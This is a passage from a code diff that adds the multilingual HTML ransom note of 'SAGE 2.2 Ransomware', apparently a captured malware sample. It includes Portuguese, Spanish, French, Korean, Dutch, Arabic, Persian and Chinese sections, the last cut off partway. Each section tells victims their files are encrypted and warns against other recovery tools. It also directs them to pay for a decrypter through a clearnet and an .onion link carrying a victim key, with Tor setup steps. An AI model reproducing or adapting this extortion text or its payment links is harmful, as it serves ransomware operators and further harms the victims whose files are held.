+						<li>abra o Internet Explorer ou qualquer outro navegador;</li>
+						<li>copie o endereço do <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> e cole na barra de endereço em seu navegador e pressione "Enter";</li>
+						<li>quando a página for aberta em seguida, você verá as informações sobre o Navegador Tor e o link para download, abra o arquivo e siga as instruções de instalação;</li>
+						<li>Quando a instalação estiver concluída, abra o Navegador Tor e pressione o botão "Connect"(o botão pode ter outro nome, se você instalou uma versão do programa que não seja em inglês);</li>
+						<li>O Navegador Tor irá estabelecer uma conexão e, em seguida, abrirá uma janela no navegador;</li>
+						<li>copie o endereço do <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> e cole na barra de endereço do Navegador Tor, em seguida, pressione "Enter";</li>
+						<li>a sua página pessoal irá abrir em alguns instantes; caso a página não abra, aguarde um pouco e tente novamente.</li>
+					</ol>
+					<p>Se você não conseguir executar todas as etapas, certifique-se de que você está conectado à internet e tente novamente. Se você ainda tiver dificuldade para conectar, peça ajuda a um técnico de informática para auxiliá-lo no processo ou procure vídeos que possam ajudá-lo no <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>Você pode encontrar uma cópia do arquivo de instrução chamado "!HELP_SOS" salvo junto ao seus arquivos criptografados.</p>
+				</div>
+			</div>
+			<div class="text l l-es" >
+				<h1>Instrucciones para la recuperación de archivos </h2>
+				<p>Probablemente hayas notado que no puedes abrir tus archivos y que algunas aplicaciones dejaron de funcionar correctamente.</p>
+				<p>Era de esperarse. El contenido de tus archivos aún está allí, pero fué encriptado por <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>Tus archivos no están perdidos, es posible regresarlos a su estado normal decodificándolos.</p>
+				<p>La única forma de hacerlo es con el software <span class='us'>"SAGE Decrypter"</span> y su clave personal de descifrado.</p>
+				<div class='info'>
+					<p>Usar cualquier otro software que asegure ser capaz de restaurar tus archivos resultará en un daño o destrucción de los archivos.</p>
+				</div>
+
+				<p>Puedes comprar el software <span class='us'>"SAGE Decrypter"</span> y tu clave de descifrado en tu página personal que puedes accesar a través de los siguientes links:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Si te es solicitada la clave personal, cópiala en el formulario del sitio. Esta es tu clave personal:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>También podrás descifrar un archivo gratis para asegurarte que el software "SAGE Decrypter" es capaz de recuperar tus archivos</p>
+
+				<div class='info'>
+					<p>Si ninguno de esos links te funciona por un tiempo prolongado o si necesitas recuperar tus archivos lo más rápido posible, también puedes accesar a tu página personal usando el "Tor Browser".</p>
+					<p>Con la finalidad de hacerlo necesitas: </p>
+					<ol>
+						<li>abrir Internet Explorer o cualquier otro navegador de internet;</li>
+						<li>copia la dirección <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> en la barra de direcciones y presiona "Enter";</li>
+						<li>una vez que abra la página, le será ofrecida la descarga de Tor Browser, descárgalo y ejecuta el instalador, siguiendo las instrucciones de instalación;</li>
+						<li>una vez culminada la instalación, abre el recien instalado Tor Browser y presione el botón "Connect" (el botón puede tener un nombre diferente dependiendo de la versión instalada);</li>
+						<li></li>
+						<li>copia la dirección <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> en la barra de direcciones del navegador y presiona "Enter";</li>
+						<li>tu página personal debería abrir ahora; si no lo hace, espera un momento e intenta de nuevo.</li>
+					</ol>
+					<p>Si no puedes hacer el procedimiento, chequea tu conexión a internet e inténtalo de nuevo. Si aún no funciona, intenta pidiéndole ayuda a un técnico de computación para seguir las instrucciones o mira algunos videos de ayuda en <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>Puedes encontrar una copia de estas instrucciones en los archivos llamados "!HELP_SOS" almacenados junto a tus archivos encriptados.</p>
+				</div>
+			</div>
+			<div class="text l l-fr" >
+				<h1>Les instructions pour restaurer le fichier</h2>
+				<p>Vous avez sûrement remarqué que vous ne pouvez pas ouvrir vos fichiers et qu’un logiciel a arrêté de fonctionner correctement.</p>
+				<p>C’est attendu. Le contenu de vos fichiers est encore disponible, mais il a été crypté par <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>Vos fichiers ne sont pas perdus, c’est possible de les récupérer et les avoir à l’état normal en les décryptant.</p>
+				<p>La seule façon de le faire et en ayant le logiciel<span class='us'>"SAGE Decrypter"</span> et votre clé de décryptage.</p>
+				<div class='info'>
+					<p>En utilisant un autre logiciel qui prétend pouvoir restaurer vos fichiers va endommager et détruir vos fichiers.</p>
+				</div>
+
+				<p>Vous pouvez acheter le logiciel <span class='us'>"SAGE Decrypter"</span> et votre clé de décryptage sur votre profile auquel vous pouvez accéder en cliquant sur ce lien:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Si vous êtes demandé de fournir votre clé, copiez la dans le formulaire du site. Voici votre clé personnelle:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>Vous serez en mesure de décrypter un fichier gratuitement pour être sûre que le logiciel "SAGE Decrypter" est capable de restaurer vos fichiers</p>
+
+				<div class='info'>
+					<p>Si aucun des liens ne marche pour vous pour une période prolongée ou si vous avez besoin de restaurer vos fichiers rapidement, vous pouvez accéder à votre profile en utilisant "Navigateut Tor".</p>
+					<p>Pour le faire vous devez:</p>
+					<ol>
+						<li>Ouvrez Explorer ou n’importe quel autre navigateut;</li>
+						<li> Copiez cette addresse <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> dans la barre d’adresse et cliquez sur "Enterer";</li>
+						<li>Une fois que la page est ouverte, on va vous proposer de télécharger le navigateur Tor, Téléchargez-le et lancez l’installation, suivez les instructions d’installation ;</li>
+						<li>Une fois l’installation faite, ouvrez votre nouveau navigateur Tor et appuyez sur le bouton "Connect"  (Le bouton peut être nommé différemment si vous n’avez pas installé la version en anglais);</li>
+						<li> Le navigateur Tor va établir une connection et ouvrir une fenêtre ordinaire de navigateur ;</li>
+						<li>copiez l’adresse <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> dans la barre d’adresse et cliquez sur "Entrer";</li>
+						<li>Votre profile doit être ouvert maintenant; si ça ne marche pas attendez puis essayez encore une fois.</li>
+					</ol>
+					<p>Si vous n’arrivez pas à suivre ces étapes verifies alors votre connexion internet et réessayez. Si ça ne marche toujours pas, essayez de demander à un informaticien pour suivre ces étapes pour vous ou regardez des vidéos d’instruction sur <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>Vous pouvez trouver une copie de ces instruction dans des fichiers nommés "!HELP_SOS" enregistrés avec vos fichiers cryptés.</p>
+				</div>
+			</div>
+			<div class="text l l-kr" >
+				<h1>파일 복구 지침</h2>
+				<p>파일을 열 수 없으며 일부 소프트웨어가 올바르게 작동하지 않는 것으로 나타났습니다.</p>
+				<p>예상대로입니다. 파일 내용은 그대로 있지만 <span class='us'>"SAGE 2.2 Ransomware"</span> 님이 암호화했습니다.</p>
+
+				<p>파일을 잃어 버리지 않으며 해독하여 정상 상태로 되돌릴 수 있습니다.</p>
+				<p>당신이 할 수있는 유일한 방법은 <span class='us'>"SAGE Decrypter"</span> 소프트웨어와 개인 복호화 키를 가져 오는 것입니다.</p>
+				<div class='info'>
+					<p>파일을 복원 할 수 있다고 주장하는 다른 소프트웨어를 사용하면 파일이 손상되거나 파괴 될 수 있습니다.</p>
+				</div>
+
+				<p><span class='us'>"SAGE Decrypter"</span> 소프트웨어 및 암호 해독 키는 개인 페이지에서 다음을 통해 액세스 할 수 있습니다:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>귀하의 개인 키를 요청하는 경우 사이트의 양식에 복사하십시오: 귀하의 개인 키</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>"SAGE Decrypter" 소프트웨어를 무료로 하나의 파일을 해독 할 수도 있습니다. 파일을 복구 할 수 있습니다 </p>
+
+				<div class='info'>
+					<p>이러한 링크 중 어느 것도 장기간 동안 작동하지 않거나 가능한 빨리 파일을 복구해야하는 경우 "Tor Browser" 를 사용하여 개인 페이지에 액세스 할 수 있습니다.</p>
+					<p>진행을 위해 다음을 시행해야 합니다:</p>
+					<ol>
+						<li>인터넷 브라우저를 실행하거나 다른 인터넷 브라우저 실행;</li>
+						<li>주소창에 <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> 주소를 복사하고 "Enter " 를 누르십시오;</li>
+						<li>페이지가 열리면 Tor 브라우저를 다운로드하여 설치 프로그램을 실행하고 설치 지침을 따르십시오;</li>
+						<li>일단 설치가 끝나면 새로 설치된 Tor 브라우저를 열고 "Connect " 버튼을 누르십시오 (영어 버전이 아닌 언어를 설치 한 경우 버튼의 이름을 다르게 지정할 수 있음).;</li>
+						<li>Tor 브라우저가 연결을 설정하고 일반 브라우저 창을 엽니다.</li>
+						<li>이 브라우저의 주소창에 <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> 주소를 복사하고 "Enter " 를 누르세요;</li>
+						<li>개인 페이지가 열리고, 잠깐 기다렸다가 다시 시도하십시오.</li>
+					</ol>
+					<p>이 단계를 수행 할 수 없다면 인터넷 연결을 확인한 후 다시 시도하십시오. 여전히 작동하지 않으면 컴퓨터 사용자에게이 단계를 수행하는 데 도움을 요청하거나 <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a> 에서 동영상 가이드를 찾아보십시오.</p>
+				</div>
+				<div class='info'>
+					<p>암호화 된 파일 옆에 저장된 "!HELP_SOS"b파일에서이 명령의 사본을 찾을 수 있습니다.</p>
+				</div>
+			</div>
+			<div class="text l l-nl" >
+				<h1>Instructies voor herstellen van bestand</h2>
+				<p>Je hebt waarschijnlijk gemerkt dat je niet je bestanden kunt openen en dat sommige software niet meer werkt.</p>
+				<p>Dit is verwacht. Je bestanden zijn er ngo steeds, maar zijn beveiligd door <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>Je bestanden zijn niet weg, het is mogelijk om ze te herstellen door de beveiliging weg te halen.</p>
+				<p>De enige manier daarvoor is om <span class='us'>"SAGE Decrypter"</span> software en je eigen persoonlijke beveiligingssleutel te halen.</p>
+				<div class='info'>
+					<p>Gebruik van andere software die claimen je bestanden te herstellen zullen ervoor zorgen dat je bestanden beschadigd of vernietigd worden.</p>
+				</div>
+
+				<p>Je kan een <span class='us'>"SAGE Decrypter"</span> software en sleutel kopen via je persoonlijke link:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>Als er wordt gevraagd voor je persoonlijke sleutel, kopieer het naar het formulier op de site. Dit is je persoonlijke sleutel:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>Je kunt één bestand gratis herstellen om er zeker van te zijn dat "SAGE Decrypter" software je bestanden kunt herstellen</p>
+
+				<div class='info'>
+					<p>Als geen van de links werken voor een lange tijd of je je bestanden zo snel mogelijk wilt herstellen, kan je ook toegang krijgen met de "Tor Browser".</p>
+					<p>Om dat te doen moet je:</p>
+					<ol>
+						<li>Internet Explorer openen of een andere internet browser;</li>
+						<li>kopieer het adres <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> in je adresbalk en druk op "Enter";</li>
+						<li>wanneer de pagina opent, kan je de Tor Browser downloaden, download en installeer het, volg de installatie instructies;</li>
+						<li>wanneer download klaar is, open de Tor Browser en druk op "Connect" knop (knop kan een andere naam hebben als je een andere taal hebt);</li>
+						<li>Tor Browser zal een connectie maken en een normale browser openen;</li>
+						<li>kopieer het adres <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> in deze browser adres en druk "Enter";</li>
+						<li>je persoonlijke pagina zou nu open moeten zijn; als dit niet zo is wacht dan een moment en probeer het opnieuw.</li>
+					</ol>
+					<p>Als je deze stappen niet kan doen check dan je internet connectie en probeer het opnieuw. Als het nog steeds niet lukt vraag een computerpersoon om deze stappen voor je te doen of kijk video´s op <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>Je kunt een kopie van deze instructies vinden in een bestand met de naam "!HELP_SOS" bij je beveiligde bestanden.</p>
+				</div>
+			</div>
+			<div class="text l l-ar" >
+				<h1> التعليمات لإستعادة ملفاتك </h2>
+				<p> قد لاحظت حتماً أنه لا يمكنك فتح ملفاتك و أن هناك برامج  توقفت عن العمل بشكل صحيح.</p>
+				<p> هذا متوقع. محتوى ملفاتك مازال موجود ولكن مشفر <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p> ملفاتك لم تضع فمن الممكن إستعادتها في الحالة الطبيعية عن طريق فك التشفيرة.</p>
+				<p> الطريقة الوحيدة للقيام به هي تحميل البرمجيات<span class='us'>"SAGE Decrypter"</span> ومفتاح فك التشفير الخاص بك.</p>
+				<div class='info'>
+					<p> باستخدام البرامج الأخرى التي تدعي استعادة الملفات الخاصة بك سوف تلحق الضرر بملفاتك وتدمرها.</p>
+				</div>
+
+				<p> يمكن اشتراء البرمجية <span class='us'>"SAGE Decrypter"</span> ومفتاح التشفير من صفحتك الشخصية من خلال إتباع هذا الرابط:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p> إذا طلب منك تقديم المفتاح الخاص بك، إنسخه في الموقع. هذا هو مفتاحك الخاص.:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p> سوف تتمكن من تشفير ملف مجاناً للتأكد من أن برمجية "SAGE Decrypter" يمكنها إستعادة ملفاتك </p>
+
+				<div class='info'>
+					<p> إذا لم يعمل أي رابط لمدة طويلة من الوقت أو إذا كنت في حاجة إلى إستعادة ملفاتك بسرعة، يمكنك الدخول إلى صفحتك الشخصية بإستعمال"Navigateut Tor".</p>
+					<p> لذلك يجب عليك:</p>
+					<ol>
+						<li> إفتح Explorer أو أي متصفح انترنات أخر;</li>
+						<li> قم بنسخ هذا العنوان <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> في مكان العناوين في المتصفح وانقر"Enterer";</li>
+						<li> عندما تفتح الصفحة، سيتم إقتراح تحميل المتصفح Tor، حمله وإبداء تثبيت البرمجية مع إتباع تعليمات التثبيت;</li>
+						<li>  عند إنتهاء التثبيت، إفتح المتصفح الجديد Tor وأنقر على الزر "Connect"  (يمكن أن يختلف إسم الزر إذا كنت لا تستعمل النسخة الإنجليزية);</li>
+						<li> المتصفح Tor سيقوم بربط  اتصال وفتح نافذة المتصفح العادي;</li>
+						<li> إنسخ الرابط<div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> في المكان المخصص للروابط في المتصفح وإنقر على "Entrer";</li>
+						<li> صفحتك الشخصية تكون قد فتحت الأن ، إذا لم يتم ذلك حاول الإنتظار قليلاً ثم حاول مرةً ثانية.</li>
+					</ol>
+					<p>إذا لم تتمكن من تنفيذ هذه الخطوات ، تحقق من الإنترنت الخاص بك وحاول مرة أخرى. إذا لم يغير ذلك شيء، حول وجود بعض المساعدة من المتخصصين في الكمبيوتر كي يتمكنوا من أداء هذه الخطوات عوضاً عنك  أو البحث عن بعض التعليمات في فيديوهات على<a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p> يمكنك التحصل على نسخة من التعليمات في ملف بعنوان "!HELP_SOS" موجود بجانب ملفاتك المشفرة.</p>
+				</div>
+			</div>
+			<div class="text l l-fa" >
+				<h1>دستورالعمل بازیابی فایل</h2>
+				<p>شما احتمالا متوجه شده اید که شما نمی توانید فایل های خود را باز کنید و برخی از نرم افزار ها کاررا متوقف کردند.</p>
+				<p>این انتظار می رود. محتوای فایل های شما هنوز هم وجود دارد، اما با رمزگذاری شده است <span class='us'>"SAGE 2.2 Ransomware"</span>.</p>
+
+				<p>فایل های شمااز دست نرفته است، برگرداندن آنها به حالت عادی با رمز گشایی امکان پذیر است.</p>
+				<p>تنها راهی که شما می توانید انجام دهید گرفتن <span class='us'>"SAGE Decrypter"</span> نرم افزار و کد رمز گشایی شخصی شماست.</p>
+				<div class='info'>
+					<p>استفاده از هر نرم افزار دیگر که ادعا می کند قادر به بازگرداندن فایل های شماست، منجر به آسیب دیدن یا نابود شدن فایل های شما می شود.</p>
+				</div>
+
+				<p>شما می توانید <span class='us'>"SAGE Decrypter"</span> نرم افزار و کلید رمزگشایی خود را در صفحه شخصی خود که توسط لینک زیر دردسترس است بخرید:</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>اگر شما برای کلید شخصی خود را مورد سوال قرارگرفتید، آن را درفرمی که درسایت است کپی کنید . این کلید شخصی شما است:</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>همچنین شماقادرخواهید بود یک فایل را به رایگان رمزگشایی کنید  "SAGE Decrypter" می تواند فایل شمارا بازگردانی کند.</p>
+
+				<div class='info'>
+					<p>اگر هیچ یک از این لینک ها  به مدت طولانی  کار نکرد و یا شما هر چه سریعتر می خواهید فایل خود را بازیابی کنید، می تواندی با استفاده از این لینک به صفحه شخصی خود بروید. "Tor Browser".</p>
+					<p>به منظور انجام این کار شما نیاز به:</p>
+					<ol>
+						<li>اینترنت اکسپلورر  و یا هر مرورگر اینترنتی دیگررا بازکنید;</li>
+						<li>آدرس را در <a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a> منوی آدرس کپی کنید و دکمه زیر را فشار دهید "Enter";</li>
+						<li>زمانی که صفحه باز می شود، به شما پیشنهاد می شود تا جستجو گر تور رادانلود کنید، آن را دانلود کنید و نصب کننده را شروع کنید، دستورالعمل نصب را دنبال کنید;</li>
+						<li>وقتی که نصب تمام شد، مرورگر تور نصب شده را بازکنید و کلید "Connect" رافشار دهید (button can be named differently if you installed non-English version);</li>
+						<li>مرورگر تور اتصال را برقرار می کند و یک پنجره معمولی بازمی کند;</li>
+						<li>آدرس را کپی کنید <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div> با این آدرس و کلید اینتر ار فشار دهید "Enter";</li>
+						<li>صفحه شخصی شما باید الان بازشود، اگر بازنشد کمی صبرکنید و دوباره تلاش کنید.</li>
+					</ol>
+					<p>اگر شما این مراحل را نمی توانید انجام دهید اتصال اینترنتی خود را بررسی کنید و دوباره تلاش کنید. اگر همچنان کار نمی کند، از یک متخصص کمک بگیرید یا به راهنمایی های ویدویی در یوتیوب نگاه کنید. <a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>.</p>
+				</div>
+				<div class='info'>
+					<p>می توانید یک کپی از این راهنما را در اینجا بیابید "!HELP_SOS" که در فایل های رمزگذاری شده شما ذخیره شده است.</p>
+				</div>
+			</div>
+			<div class="text l l-zh" >
+				<h1>文件恢复指南</h2>
+				<p>您可能已注意到无法打开您的文件，一些软件也无法正常使用。</p>
+				<p>这没有错。您的文件内容依然存在，只是使用<span class='us'>"SAGE 2.2 Ransomware"</span>进行了加密处理。</p>
+
+				<p>您的文件内容没有丢失，可以通过解密将它们恢复到正常状态。</p>
+				<p>解密文件的唯一方法是获得我们的<span class='us'>"SAGE Decrypter"</span>软件，并使用您的个人密钥进行解密。 </p>
+				<div class='info'>
+					<p>使用任何其它声称可以恢复您文件的软件可能造成文件损坏或者销毁。</p>
+				</div>
+
+				<p>您可以点击下列链接，进入您的个人购买<span class='us'>"SAGE Decrypter"</span>软件和您的解密密钥。</p>
+				<div class='keys links'>
+					<div class='key'>
+						<a href="http://7gie6ffnkrjykggd.3io74zx.com/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA" onclick='javascript:return openlink(this.href)'>http://7gie6ffnkrjykggd.3io74zx.com/</a>
+					</div>
+					
+				</div>
+
+				<div class='info lu lu-orig'>
+					<p>If none of these links work for you, <a href='#' onclick='javascript:return updateLinks()'><b>click here</b></a> to update the list.</p>
+				</div>
+				<div class='info lu lu-updating'>
+					<p>Updating links...</p>
+				</div>
+				<div class='info lu lu-error'>
+					<p>Something went wrong while updating links, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+				<div class='info lu lu-done'>
+					<p>Links updated, if new ones still don't work, please wait some time and <a href='#' onclick='javascript:return updateLinks()'><b>try again</b></a> or use "Tor Browser" method below.</p>
+				</div>
+
+				<p>如果网页寻问您的个人密钥，将下列密钥拷贝到网页上的表单输入框中：</p>
+				<div class='keys'>
+					<div class='key'>
+						AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA
+					</div>
+				</div>
+
+				<p>您可以免费使用"SAGE Decrypter"软件解密一个文件，以确保软件可以恢复您的所有文件。</p>
+
+				<div class='info'>
+					<p>如果您长时间无法打开任一链接，或者您想尽快恢复您的文件，您可以使用"Tor浏览器"访问您的个人主页。</p>
+					<p>为此您必须：</p>
+					<ol>
+						<li>打开IE浏览器，或者其它任何一款浏览器；</li>
+						<li>将地址<a href='https://www.torproject.org/download/download-easy.html.en' onclick='javascript:return openlink(this.href)'>https://www.torproject.org/download/download-easy.html.en</a>拷贝到地址栏，然后按下"回车"键；</li>
+						<li>一旦页面打开，您就可以下载Tor浏览器，下载完成后运行安装文件，按照提示进行安装；</li>
+						<li>一旦安装完成，打开新安装的Tor浏览器，点击"Connect" 按钮 (如果您安装了非英文版本，按钮名称可能有所有不同)；</li>
+						<li>Tor浏览器将建立连接，然后打开一个正常的浏览窗口；</li>
+						<li>拷贝地址 <div class='key'>http://7gie6ffnkrjykggd.onion/login/AYuuiybZc-ewBpAX2M3g6NjNfJKNbbvNzuKXlsV6oI-tHna9ZMGDCXzA</div>到浏览器的地址栏，然后按下"回车"键；</li>
+						<li>您的个人页面将打开；如若不然，请稍等一会再试一下。</li>
+					</ol>
+					<p>如果您无法打开页面，请检查您的因特网连接，然后重新试一下。如果仍然无法打开，请找熟悉电脑的人员帮助您，或者观看视频指南<a href='https://www.youtube.com/results?search_query=tor+browser+install' onclick='javascript:return openlink(this.href)'>YouTube</a>。</p>
